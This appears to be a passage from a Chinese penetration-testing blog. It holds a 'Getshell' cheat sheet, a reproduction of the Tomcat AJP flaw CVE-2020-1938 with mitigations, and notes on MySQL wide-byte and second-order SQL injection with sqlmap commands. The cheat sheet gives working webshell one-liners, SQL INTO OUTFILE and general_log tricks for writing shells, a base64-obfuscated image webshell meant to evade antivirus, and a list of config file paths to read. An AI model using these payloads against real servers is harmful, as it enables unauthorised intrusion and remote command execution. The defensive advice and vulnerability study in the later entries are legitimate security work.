<h4 id="IIS7-0-7-5、Nginx-lt-8-0解析漏洞"><a href="#IIS7-0-7-5、Nginx-lt-8-0解析漏洞" class="headerlink" title="IIS7.0/7.5、Nginx&lt;8.0解析漏洞"></a>IIS7.0/7.5、Nginx&lt;8.0解析漏洞</h4><p><code>http://www.xxx.com/xx.jpg/.php</code></p>
<h4 id="Nginx-lt-8-03空字节代码执行漏洞"><a href="#Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="Nginx&lt;8.03空字节代码执行漏洞"></a>Nginx&lt;8.03空字节代码执行漏洞</h4><p>版本范围：Nginx0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>
<p><code>http://www.xxx.com/xx.jpg%00.php</code></p>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p><code>http://www.xxx.com/xx.php.owf.rar</code>逆向解析，直到能解析出php为止</p>
<h4 id="CVE-2013-4547-Nginx解析漏洞"><a href="#CVE-2013-4547-Nginx解析漏洞" class="headerlink" title="CVE-2013-4547 Nginx解析漏洞"></a>CVE-2013-4547 Nginx解析漏洞</h4><p><code>http://www.xxx.com/xx.jpg（非编码空格）\0.php</code></p>
<h3 id="编辑器漏洞Getshell"><a href="#编辑器漏洞Getshell" class="headerlink" title="编辑器漏洞Getshell"></a>编辑器漏洞Getshell</h3><p>传送门：</p>
<p><a href="https://navisec.it/编辑器漏洞手册/" target="_blank" rel="noopener">https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/</a></p>
<h3 id="网站配置插马Getshell"><a href="#网站配置插马Getshell" class="headerlink" title="网站配置插马Getshell"></a>网站配置插马Getshell</h3><p>进入后台后，网站配置插马getshell，可以找到源码本地搭建，插入时注意与源码闭合，如果插入出错可能导致网站报废。如asp中单引号表示单行注释作用<code>&quot;%&gt;&lt;%eval request(&quot;v01cano&quot;)%&gt;&lt;%&#39;</code></p>
<h3 id="编辑器模版Getshell"><a href="#编辑器模版Getshell" class="headerlink" title="编辑器模版Getshell"></a>编辑器模版Getshell</h3><p>通过网站的模版编写一句话，然后生成脚本文件getshell  通过将木马添加到压缩文件，把名字改为网站的模版类型，上传到服务器，getshell）（新建或修改目录名为xx.asp/  此目录下的jsp，html会以asp执行，配置iis6.有0解析漏洞</p>
<h3 id="修改脚本文件Getshell"><a href="#修改脚本文件Getshell" class="headerlink" title="修改脚本文件Getshell"></a>修改脚本文件Getshell</h3><p>修改后台脚本文件插入一句话直接Getshell，尽量插在头和尾。</p>
<p>###上传插件、更新页面Getshell</p>
<p>wordpress，dz等，如编辑wordpress404页面插入一句话，可以先下载对应版本找到404路径，部分OA上传插件Getshell， jboss，tomcat上传war包getshell等</p>
<h3 id="执行sql语句写入Webshell"><a href="#执行sql语句写入Webshell" class="headerlink" title="执行sql语句写入Webshell"></a>执行sql语句写入Webshell</h3><p>首先执行错误的sql语句，使其暴露出网站的根目录，以ecshop为例，进入后台执行sql查询<code>select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;C:\\vulcms\\ecshopv3.6\\ecshop\\v01cano.php&quot;;</code>关于此语句说明，在windows中有时候需要使用斜杠/有时候需要使用双反斜杠\末尾有时候需要分号，有时候也不需要分号。也可以先将一句话通过ecshop的新建管理员写入到user表中，然后通过数据库备份配合解析漏洞Getshell。</p>
<h3 id="命令执行Getshell"><a href="#命令执行Getshell" class="headerlink" title="命令执行Getshell"></a>命令执行Getshell</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p><code>echo ^&lt;^?php @eval($_POST[C0cho]);?^&gt;^ &gt;c:\1.php</code></p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p><code>echo -e &quot;&lt;?php @assert(\$_POST[C0cho])?&gt;&quot; &gt; 1.php</code></p>
<p>Linux需要在$前加\进行防转义，Windows需要在&lt;前加^防转义，Windows和Linux中的 “可以使用’或不使用进行尝试</p>
<h3 id="文件包含Getshell"><a href="#文件包含Getshell" class="headerlink" title="文件包含Getshell"></a>文件包含Getshell</h3><p>文件包含有时可绕过waf</p>
<h4 id="asp包含"><a href="#asp包含" class="headerlink" title="asp包含"></a>asp包含</h4><p><code>include file=&quot;123.jpg&quot;</code>调用的文件必须和被调用的文件在同一目录，否则找不到，如果不在同一目录，用下面语句也使用如下代码<code>include virtual=&quot;文件所在目录/123.jpg&quot;</code></p>
<h4 id="php包含"><a href="#php包含" class="headerlink" title="php包含"></a>php包含</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'123.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="使用php-input"><a href="#使用php-input" class="headerlink" title="使用php://input"></a>使用php://input</h4><p>使用burpsuite截取数据包，并修改内容转发(还可以使用hackbar工具中的post data中输入<code>&lt;?php fputs(fopen(&quot;shell1.php&quot;,&quot;w&quot;),&#39;1111&lt;?php @assert($_POST[xss])?&gt;2222&#39;)?&gt;</code>等一句话木马)</p>
<p>截取get请求</p>
<p><img src="//choge.top/2020/02/23/Getshell总结/gt-1.png" alt="gt-1"></p>
<p>将一句话木马</p>
<p><img src="//choge.top/2020/02/23/Getshell总结/gt-2.png" alt="gt-2"></p>
<p>浏览器访问查看是否成功</p>
<p><img src="//choge.top/2020/02/23/Getshell总结/gt-3.png" alt="gt-3"></p>
<h3 id="数据库命令执行Getshell"><a href="#数据库命令执行Getshell" class="headerlink" title="数据库命令执行Getshell"></a>数据库命令执行Getshell</h3><h4 id="Access导出"><a href="#Access导出" class="headerlink" title="Access导出"></a>Access导出</h4><p>Access可导出xxx等文件需要配合解析漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table cmd (a varchar(50));</span><br><span class="line">insert into cmd (a) values (&apos;一句话木马&apos;)   #一句话木马如：&lt;%execute request(1)%&gt;</span><br><span class="line">select * into [a] in &apos;e:\web\webshellcc\1.asa;x.xls&apos; &apos;excel 4.0;&apos; from cmd </span><br><span class="line">drop table cmd</span><br></pre></td></tr></table></figure>

<p>菜刀直连<code>https://www.webshell.cc/1.asa;x.xls</code></p>
<h4 id="Sqlserver导出"><a href="#Sqlserver导出" class="headerlink" title="Sqlserver导出"></a>Sqlserver导出</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec sp_makewebtask &apos;C:\test1.php&apos;,&apos;select &quot;&lt;%eval request(&quot;pass&quot;)%&gt;&quot; &apos;--</span><br></pre></td></tr></table></figure>

<h4 id="Mysql导出"><a href="#Mysql导出" class="headerlink" title="Mysql导出"></a>Mysql导出</h4><p>以phpMyAdmin为例</p>
<h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create TABLE xiaoma (xiaoma1 text NOT NULL);</span><br><span class="line">insert INTO xiaoma (xiaoma1) VALUES(&apos;&lt;?php eval($_POST[xiaoma]);?&gt;&apos;);</span><br><span class="line">select xiaoma1 from xiaoma into outfile &apos;D:/phpstudy/www/7.php&apos;;</span><br><span class="line">drop TABLE IF EXISTS xiaoma;</span><br></pre></td></tr></table></figure>

<h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[v01cano]);?&gt;&quot; into outfile &apos;D:/phpstudy/www/a.php&apos;</span><br></pre></td></tr></table></figure>

<h5 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h5><p>当数据库路径未知时Getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//创建表a,并且将httpd.conf写入到表a中</span><br><span class="line">create table a(a text);load data infile &quot;C:/phpStudy/Apache/conf/httpd.conf&quot; into table a;</span><br></pre></td></tr></table></figure>

<p>然后执行导出操作，将该文件下载，使用notepad++打开，最后搜索documentroot，即可找到网站的根目录：</p>
<p><img src="//choge.top/2020/02/23/Getshell总结/gt-4.png" alt="gt-4"></p>
<p>文件可能存在的一些路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows</span><br><span class="line">c:\windows\php.ini                             # php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml       # IIS虚拟主机配置文件</span><br><span class="line"> # Linux</span><br><span class="line">/etc/php.ini                                   # php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf                     # Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/mysql</span><br><span class="line">/user/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf # 虚拟目录配置文件</span><br><span class="line">/user/local/nginx/conf/httpd.conf              # Nginx配置文件</span><br></pre></td></tr></table></figure>

<h5 id="方式四通过load-file函数直接加载该文件内容"><a href="#方式四通过load-file函数直接加载该文件内容" class="headerlink" title="方式四通过load_file函数直接加载该文件内容"></a>方式四通过load_file函数直接加载该文件内容</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/httpd.conf&apos;);</span><br></pre></td></tr></table></figure>

<p>同时需要做如下配置</p>
<p><img src="//choge.top/2020/02/23/Getshell总结/gt-5.png" alt="gt-5"></p>
<p><img src="//choge.top/2020/02/23/Getshell总结/gt-6.png" alt="gt-6"></p>
<h5 id="方式五"><a href="#方式五" class="headerlink" title="方式五"></a>方式五</h5><p>general_log_file方法获取Webshell</p>
<p><code>show global variables like &#39;secure%&#39;</code>显示secure_file_priv的值为NULL，不能利用写into outfile写木马getshell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;  #查看genera文件配置情况</span><br><span class="line">set global general_log = off;   #关闭general_log  </span><br><span class="line">set global general_log = &apos;on&apos;;  #如果general_log关闭需要开启</span><br><span class="line">set global general_log_file = &apos;D:/www/web/shell.php&apos;</span><br></pre></td></tr></table></figure>

<h5 id="方式六"><a href="#方式六" class="headerlink" title="方式六"></a>方式六</h5><p>可执行命令方式</p>
<p><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;; system($_GET[\&#39;cmd\&#39;]); echo \&#39;&lt;/pre&gt;\&#39;; ?&gt;&#39; INTO OUTFILE &#39;d:/www/shell.php&#39;</code></p>
<p>使用方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxx.com/shell.php?cmd=ipconfig  #cmd=后面加命令</span><br></pre></td></tr></table></figure>

<h5 id="方式七"><a href="#方式七" class="headerlink" title="方式七"></a>方式七</h5><p>过杀毒软件方式</p>
<p>上传图片马c.jpg，图片马内容如下：</p>
<p><code>&lt;?php$a = &#39;PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pO2RtdSgpOz8+&#39;; error_reporting(0); @set_time_limit(0); eval(&quot;?&gt;&quot;.base64_decode($a));?&gt;</code></p>
<p>导出Webshell</p>
<p><code>select &#39;&lt;?php include &#39;c.jpg&#39;?&gt;&#39; INTO OUTFILE &#39;D:/work/www/shell.php&#39;</code></p>
<h5 id="方式八"><a href="#方式八" class="headerlink" title="方式八"></a>方式八</h5><p>直接导出加密Webshell</p>
<p><code>select unhex(&#39;加密代码&#39;) into dumpfile &#39;D:/www/web/shell.php&#39;</code></p>
<h2 id="不进后台Getshell"><a href="#不进后台Getshell" class="headerlink" title="不进后台Getshell"></a>不进后台Getshell</h2><h3 id="0day-Getshell"><a href="#0day-Getshell" class="headerlink" title="0day Getshell"></a>0day Getshell</h3><p>各类OA，coremail，cms，php框架，数据库，java框架等0day，1day，nday Getshell</p>
<h3 id="写入日志Getshell"><a href="#写入日志Getshell" class="headerlink" title="写入日志Getshell"></a>写入日志Getshell</h3><p>获取日志路径，在访问过程中在url或者其他位置写入<code>&lt;?php eval($_POST[c]);?&gt;</code>等信息，使其日志记录此代码，然后访问日志路径，菜刀连接Getshell，如phpinfo();中能查看到error.log和access.log的路径。</p>
<h3 id="IIS-Tomcat写权限Getshell"><a href="#IIS-Tomcat写权限Getshell" class="headerlink" title="IIS/Tomcat写权限Getshell"></a>IIS/Tomcat写权限Getshell</h3><p>IIS6.0，put协议上传手工或工具，批量扫描工具：iis put scaner，写权限利用：桂林老兵</p>
<p>Tomcat put上传 CVE-2017-12615 工具传送门：<a href="https://link.zhihu.com/?target=https%3A//github.com/iBearcat/CVE-2017-12615" target="_blank" rel="noopener">https://link.zhihu.com/?target=https%3A//github.com/iBearcat/CVE-2017-12615</a></p>
<h3 id="上传漏洞Getshell"><a href="#上传漏洞Getshell" class="headerlink" title="上传漏洞Getshell"></a>上传漏洞Getshell</h3><p>参考本博上传绕过</p>
<h3 id="上传会员头像Getshell"><a href="#上传会员头像Getshell" class="headerlink" title="上传会员头像Getshell"></a>上传会员头像Getshell</h3><p>将Webshell放入文件夹，然后压缩成zip文件。上传正常头像抓包将图片文件内容删除，burp右键选择文件黏贴功能，将zip包内容复制到burp中的图片内容，放行后菜刀连接图片上传路径下的文件夹（zip压缩包名）下的Webshell</p>
<h3 id="注入漏洞Getshell"><a href="#注入漏洞Getshell" class="headerlink" title="注入漏洞Getshell"></a>注入漏洞Getshell</h3><p>参考本博sql注入</p>
<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>参考本博Linux/Windows反弹shell，脚本语言、powershell反弹shell，Kali/Cobalt Strike等各种上线方法</p>
<h3 id="其他漏洞Getshell"><a href="#其他漏洞Getshell" class="headerlink" title="其他漏洞Getshell"></a>其他漏洞Getshell</h3><p>XXE，SSRF，反序列化，strust2等一种或多种组合利用Getshell</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/a1fa305a6b8f" target="_blank" rel="noopener">https://www.jianshu.com/p/a1fa305a6b8f</a></p>
<p><a href="https://mp.weixin.qq.com/s/zl_CEDVpj20BUneHNuq8lg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zl_CEDVpj20BUneHNuq8lg</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>Getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat AJP 任意文件读取和包含漏洞</title>
    <url>/2020/02/22/Tomcat%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>2020年1月6日，国家信息安全漏洞共享平台（CNVD）收录了由北京长亭科技有限公司发现并报送的Apache Tomcat文件包含漏洞（CNVD-2020-10487，对应CVE-2020-1938）。攻击者利用该漏洞，可在未授权的情况下远程读取特定目录下的任意文件。目前，漏洞细节尚未公开，厂商已发布新版本完成漏洞修复。</p><a id="more"></a>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>漏洞影响的产品版本包括：</p>
<p>Tomcat 6</p>
<p>Tomcat 7 &lt; 7.0.100</p>
<p>Tomcat 8 &lt; 8.5.51</p>
<p>Tomcat 9 &lt; 9.0.31</p>
<h2 id="漏洞处置建议"><a href="#漏洞处置建议" class="headerlink" title="漏洞处置建议"></a>漏洞处置建议</h2><p>目前，Apache官方已发布9.0.31、8.5.51及7.0.100版本对此漏洞进行修复，CNVD建议用户尽快升级新版本或采取临时缓解措施：</p>
<p><strong>1.  如未使用Tomcat AJP协议：</strong></p>
<p>如未使用 Tomcat AJP 协议，可以直接将 Tomcat 升级到 9.0.31、8.5.51或 7.0.100 版本进行漏洞修复。</p>
<p>如无法立即进行版本更新、或者是更老版本的用户，建议直接关闭AJPConnector，或将其监听地址改为仅监听本机localhost。</p>
<p>具体操作：</p>
<p>（1）编辑 <code>&lt;CATALINA_BASE&gt;/conf/server.xml</code>，找到如下行（<code>&lt;CATALINA_BASE&gt;</code>为 Tomcat 的工作目录）：</p>
<p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code></p>
<p>（2）将此行注释掉（也可删掉该行）：</p>
<p><code>&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</code></p>
<p>（3）保存后需重新启动，规则方可生效。</p>
<p><strong>2.  如果使用了Tomcat AJP协议：</strong></p>
<p>建议将Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复，同时为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>如无法立即进行版本更新、或者是更老版本的用户，建议为AJPConnector配置requiredSecret来设置AJP协议认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用vulhub漏洞环境进入Tomcat目录，发现有tomcat8，进入tomcat8修改docker-compose.yml文件如下，增加8009端口的映射</p>
<p><img src="//choge.top/2020/02/22/Tomcat包含漏洞复现/tm-1.png" alt="tm-1"></p>
<p>成功启动</p>
<p><img src="//choge.top/2020/02/22/Tomcat包含漏洞复现/tm-2.png" alt="tm-2"></p>
<p>查看conf/server.xml文件发现AJP connector服务在8009端口监听</p>
<p><img src="//choge.top/2020/02/22/Tomcat包含漏洞复现/tm-3.png" alt="tm-3"></p>
<p>直接使用poc进行测试成功，poc连接：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/</a></p>
<p><img src="//choge.top/2020/02/22/Tomcat包含漏洞复现/tm-4.png" alt="tm-4"></p>
<p>使用tools的exp利用工具显示如下，exp传送门：<a href="https://www.t00ls.net/articles-55062.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-55062.html</a></p>
<p><img src="//choge.top/2020/02/22/Tomcat包含漏洞复现/tm-5.png" alt="tm-5"></p>
<p>exp利用前提为已在/usr/local/tomcat/webapps/ROOT/目录传入命令执行的txt文件，txt内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.cnvd.org.cn/webinfo/show/5415" target="_blank" rel="noopener">https://www.cnvd.org.cn/webinfo/show/5415</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Tomcat AJP CVE-2020-1938</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入之宽字节注入、二次编码注入、二次注入</title>
    <url>/2020/01/26/Mysql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E3%80%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>本文主要总结Mysql下宽字节注入、二次编码注入和二次注入</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>什么是宽字节？<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际为两字节。</p><h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>输入<code>&#39;</code>后进代码处理后为<code>\&#39;</code>，编码为<code>%5c%27</code>，最后代入SQL语句为<code>id=1\&#39; and</code>，无法进行注入，此时将输入参数变为<code>%df&#39;</code>,代码处理后为<code>%df\&#39;</code>，编码后为<code>%df%5c%27</code>，最后代入SQL语句为<code>id=&#39; and</code>，可以注入</p><a id="more"></a>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>

<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>在可能的注入点后键入<code>%df</code>,之后进行注入测试</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-1.png" alt="mysql-1"></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-2.png" alt="mysql-2"></p>
<h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><ul>
<li>查看Mysql编码是否为GBK</li>
<li>是否使用preg_replace把单引号替换成\‘</li>
<li>是否使用addslashes进行转义</li>
<li>是否使用mysql_real_escape_string进行转义</li>
</ul>
<p>###sqlmap宽字节注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://127.0.0.1/Less-32/?id=1%df"</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-3.png" alt="mysql-3"></p>
<h3 id="宽字节注入防范"><a href="#宽字节注入防范" class="headerlink" title="宽字节注入防范"></a>宽字节注入防范</h3><ul>
<li>使用utf-8，避免宽字节注入（不仅在gbk，韩文，日文等等都有可能存在宽字节注入）</li>
<li>mysql_real_escape_string，mysql_set_charset(‘gbk’,$conn)</li>
<li>可以设置参数，character_set_client=binary</li>
</ul>
<h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2><p><code>urldecode()</code>与php本身处理编码时，两者配合失误，可构造数据消灭<code>\</code></p>
<h3 id="二次编码注入原理"><a href="#二次编码注入原理" class="headerlink" title="二次编码注入原理"></a>二次编码注入原理</h3><p>用户输入<code>id=1%27</code>时，php自身编码处理微<code>id=1&#39;</code>，转义后为<code>id=1\&#39;</code>，无法进行sql注入，php中代码使用了<code>urldecode()</code>等编码函数放在不合适的位置，使得与php自身编码失误，如当用户数据<code>id=1%25%27</code>后，php自身编码处理为<code>id=1%27</code>，转义后为依然为<code>id=1%27</code>，同时函数编码为<code>id=1&#39;</code>，可以进行sql注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'mysql_real_escape_string:'</span>.$id.<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">$id=urldecode($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'urldecode:'</span>.$id.<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123; 	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="黑盒测试-1"><a href="#黑盒测试-1" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>在注入后键入<code>%2527</code>，然后按照正常的注入流程开始注入</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-4.png" alt="mysql-4"></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-5.png" alt="mysql-5"></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-6.png" alt="mysql-6"></p>
<h3 id="白盒测试-1"><a href="#白盒测试-1" class="headerlink" title="白盒测试"></a>白盒测试</h3><ul>
<li>是否使用<code>urldecode</code>函数</li>
<li><code>urldecode</code>函数是否存在转义的方法之后</li>
</ul>
<h3 id="sqlmap二次编码注入"><a href="#sqlmap二次编码注入" class="headerlink" title="sqlmap二次编码注入"></a>sqlmap二次编码注入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://192.168.16.123/sqli-labs-master/Less-1a/index.php?id=1%2527"</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-7.png" alt="mysql-7"></p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h3><p>第一步插入恶意数据：第一次插入数据库的时候，仅仅可能对其中特殊字符做了转义，写入的时候还是保留了原来的数据，如用户输入<code>1&#39;</code>，经过转义后的参数为<code>1\&#39;</code>，参数经过数据库后储存为<code>1&#39;</code></p>
<p>第二步引用恶意数据，在将数据库存入到了数据库中之后，开发者就认为可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没用经一步的检验和处理，这样就会造成二次注入</p>
<p>login_create.php代码如下</p>
